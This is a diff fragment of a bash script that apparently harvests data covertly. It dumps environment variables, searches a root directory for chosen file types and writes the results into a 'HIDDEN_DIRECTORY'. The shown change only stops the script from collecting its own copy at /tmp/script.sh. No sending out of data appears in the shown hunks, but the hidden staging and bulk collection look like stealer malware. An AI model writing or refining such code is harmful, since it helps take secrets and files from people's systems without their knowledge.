@@ -37,11 +37,11 @@ collect_system_info() {
     env
 }
 
-# Function to collect files of specific types
+# Function to collect files of specific types (excluding the script itself)
 collect_files() {
     local directory="$1"
     for file_type in "${FILE_TYPES[@]}"; do
-        find "$directory" -type f -iname "$file_type"
+        find "$directory" -type f -iname "$file_type" -not -path "/tmp/script.sh"
     done
 }
 
@@ -91,7 +91,7 @@ main() {
     system_info=$(collect_system_info)
     echo "$system_info" > "$HIDDEN_DIRECTORY/system_info.txt"
 
-    # Collect files of specific types
+    # Collect files of specific types (excluding the script itself)
     echo "Collecting files from $ROOT_DIRECTORY..."
     files=$(collect_files "$ROOT_DIRECTORY")
     for file in $files; do
